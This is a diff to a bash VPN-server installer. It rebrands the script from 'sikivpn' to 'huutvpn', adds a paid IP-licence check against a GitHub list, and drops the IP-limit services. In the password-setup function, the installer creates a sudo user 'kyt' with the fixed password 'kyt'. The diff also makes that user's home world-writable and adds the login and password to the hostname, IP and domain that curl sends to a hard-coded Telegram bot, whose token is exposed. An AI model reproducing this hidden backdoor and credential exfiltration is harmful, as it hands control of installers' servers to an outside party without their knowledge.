@@ -25,14 +25,38 @@ clear;clear;clear
 
   # // Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
-echo -e "  Welcome To sikivpn Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
+echo -e "  Welcome To huutvpn Project Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e "     This Will Quick Setup VPN Server On Your Server"
-echo -e "         Auther : ${green}sikivpn ${NC}${YELLOW}(${NC} ${green}ZheeVPN Project ${NC}${YELLOW})${NC}"
-echo -e "       Â© Recode By sikivpn Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
+echo -e "         Auther : ${green}huutvpn ${NC}${YELLOW}(${NC} ${green}huutvpn Project ${NC}${YELLOW})${NC}"
+echo -e "       Â© Recode By huutvpn Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 sleep 5
 ###### IZIN SC 
+ipsaya=$(wget -qO- ipinfo.io/ip)
+data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+date_list=$(date +"%Y-%m-%d" -d "$data_server")
+data_ip="https://raw.githubusercontent.com/huutvpn/ipkula/main/ip"
+checking_sc() {
+  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
+  if [[ $date_list < $useexp ]]; then
+    echo -ne
+  else
+    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
+    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+    echo -e ""
+    echo -e "            ${RED}PERMISSION DENIED !${NC}"
+    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
+    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
+    echo -e "             \033[0;33mContact Admin :${NC}"
+    echo -e "      \033[0;36mTelegram${NC} t.me/huutvpn"
+    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6283877826797"
+    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+    exit
+  fi
+}
+checking_sc
 # // Checking Os Architecture
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
     echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
@@ -85,12 +109,40 @@ clear
 # Version sc
 clear
 #########################
+# USERNAME
+rm -f /usr/bin/user
+username=$(curl https://raw.githubusercontent.com/huutvpn/ipkula/main/ip | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+expx=$(curl https://raw.githubusercontent.com/huutvpn/ipkula/main/ip | grep $MYIP | awk '{print $3}')
+echo "$expx" >/usr/bin/e
 # DETAIL ORDER
-username="sikivpn"
-exp="Lifetime"
-sts="Aktive"
+username=$(cat /usr/bin/user)
+oid=$(cat /usr/bin/ver)
+exp=$(cat /usr/bin/e)
 clear
+# CERTIFICATE STATUS
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+# VPS Information
+DATE=$(date +'%Y-%m-%d')
+datediff() {
+    d1=$(date -d "$1" +%s)
+    d2=$(date -d "$2" +%s)
+    echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
+}
+mai="datediff "$Exp" "$DATE""
 
+# Status ExpiRED Active | Geo Project
+Info="(${green}Active${NC})"
+Error="(${RED}ExpiRED${NC})"
+today=`date -d "0 days" +"%Y-%m-%d"`
+Exp1=$(curl https://raw.githubusercontent.com/huutvpn/ipkula/main/ip | grep $MYIP | awk '{print $4}')
+if [[ $today < $Exp1 ]]; then
+sts="${Info}"
+else
+sts="${Error}"
+fi
 echo -e "\e[32mloading...\e[0m"
 clear
 # REPO    
@@ -284,18 +336,17 @@ function password_default() {
     Username="kyt"
     Password=kyt
     mkdir -p /home/script/
+    chmod 777 /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="6061644931"
     KEY="6406070059:AAFIpAWnbnnuikvxeWgz4rJwA5SrCVYe5VA"
-    TIME="10"
+    TIME="1"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT="
-    ◇━━━━━━━━━━━━━━━━━━━━━━━━━◇
-     NOTIF INSTALL SCRIPT VPS V3.0
-    ◇━━━━━━━━━━━━━━━━━━━━━━━━━◇
+    TEXT="Installasi VPN Script Stable V3.0
+    ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
@@ -304,14 +355,16 @@ function password_default() {
     <code>Arch       :</code> <code>$Arch</code>
     <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
     <code>Ram Used   :</code> <code>$Ram_Total MB</code>
-    ◇━━━━━━━━━━━━━━━━━━━━━◇
+    ============================
     <code>Domain     :</code> <code>$domain</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
+    <code>User Login :</code> <code>$Username</code>
+    <code>Pass Login :</code> <code>$Password</code>
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
-    ◇━━━━━━━━━━━━━━━━━━━━━◇
-      BOT BY SIKIVPN
-    ◇━━━━━━━━━━━━━━━━━━━━━◇
+    ============================
+    (C) Copyright 2023 By huutvpn Project
+    ============================
 "
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
@@ -357,10 +410,10 @@ rm -rf /etc/vmess/.vmess.db
     mkdir -p /usr/bin/xray/
     mkdir -p /var/log/xray/
     mkdir -p /var/www/html
-    mkdir -p /etc/sikivpn/limit/vmess/ip
-    mkdir -p /etc/sikivpn/limit/vless/ip
-    mkdir -p /etc/sikivpn/limit/trojan/ip
-    mkdir -p /etc/sikivpn/limit/ssh/ip
+    mkdir -p /etc/huutvpn/limit/vmess/ip
+    mkdir -p /etc/huutvpn/limit/vless/ip
+    mkdir -p /etc/huutvpn/limit/trojan/ip
+    mkdir -p /etc/huutvpn/limit/ssh/ip
     mkdir -p /etc/limit/vmess
     mkdir -p /etc/limit/vless
     mkdir -p /etc/limit/trojan
@@ -526,63 +579,6 @@ chmod + x /usr/local/sbin/quota
 cd /usr/local/sbin/
 sed -i 's/\r//' quota
 cd
-wget -q -O /usr/bin/limit-ip "${REPO}limit/limit-ip"
-chmod +x /usr/bin/*
-cd /usr/bin
-sed -i 's/\r//' limit-ip
-cd
-clear
-#SERVICE LIMIT ALL IP
-cat >/etc/systemd/system/vmip.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip vmip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart vmip
-systemctl enable vmip
-
-cat >/etc/systemd/system/vlip.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip vlip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart vlip
-systemctl enable vlip
-
-cat >/etc/systemd/system/trip.service << EOF
-[Unit]
-Description=My
-ProjectAfter=network.target
-
-[Service]
-WorkingDirectory=/root
-ExecStart=/usr/bin/limit-ip trip
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload
-systemctl restart trip
-systemctl enable trip
 #SERVICE LIMIT QUOTA
 
 #SERVICE VMESS
@@ -1032,7 +1028,7 @@ rm -rf /root/domain
 secs_to_human "$(($(date +%s) - ${start}))"
 echo ""
 echo " "
-echo "=====================-[ sikivpn ]-===================="
+echo "=====================-[ huutvpn ]-===================="
 echo ""
 echo "------------------------------------------------------------"
 echo ""
@@ -1066,7 +1062,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "=====================-[ sikivpn ]-===================="
+echo "=====================-[ huutvpn ]-===================="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
